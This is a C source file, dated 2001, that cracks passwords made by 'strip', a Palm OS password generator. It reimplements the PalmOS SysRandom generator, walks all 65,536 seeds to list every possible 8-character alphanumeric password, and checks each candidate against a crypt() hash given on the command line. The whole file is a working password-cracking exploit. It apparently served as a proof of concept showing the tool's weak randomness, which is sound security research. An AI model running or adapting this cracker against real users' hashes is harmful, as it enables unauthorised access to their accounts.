/*
 * Crack passwords generate by strip ("Secure Tool for Recalling
 * Important Passwords") for the Palm; see
 * <http://www.zetetic.net/products.html> for details.
 * 
 * Copyright (c) 2001 by Thomas Roessler
 * <roessler@does-not-exist.org>.
 * 
 * Use, distribute and modify freely.
 * 
 */

#include <stdio.h>
#include <stdlib.h>

#include <string.h>
#include <crypt.h>

/* The PalmOS SysRandom() RNG. */

static unsigned int multiplier = 22695477;
static unsigned int _seed = 0;

short palm_rand (unsigned int new_seed)
{
  if (new_seed)
    _seed = new_seed;
  
  _seed = (_seed * multiplier) + 1;
  return (short)  ((_seed >> 16)  & 0x7fff);
}

/* 
 * Strip's password generation algorithm for the alphanumeric case - 
 * you can easily change this to cover the other cases as well.
 */

static char *alphas = "abcdefhijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
static char *numerics = "0123456789";

char *possible_password (unsigned int seed, int size)
{
  static char pwbuff[1024];
  char z[1024];
  int i, r;
  int valids;

  if (size > sizeof (pwbuff))
    exit (1);
  
  sprintf (z, "%s%s",numerics, alphas);
  valids = strlen (z);
  
  r = palm_rand (seed);

  for (i = 0; i < size; i++)
  {
    r = palm_rand (0);
    pwbuff[i] = z[r % valids];
  }
  pwbuff[i] = '\0';
  
  return pwbuff;
}

/* check all possible passwords */

int main (int argc, char *argv[])
{
  int i;
  char *pw;
  
  for (i = 0; i <= 0xffff; i++)
  {
    pw = possible_password ((short) i, 8);
    if (!argv[1] || !strcmp (argv[1], crypt (pw, argv[1])))
      printf ("%s\n", pw);
  }
  
  return 0;
}
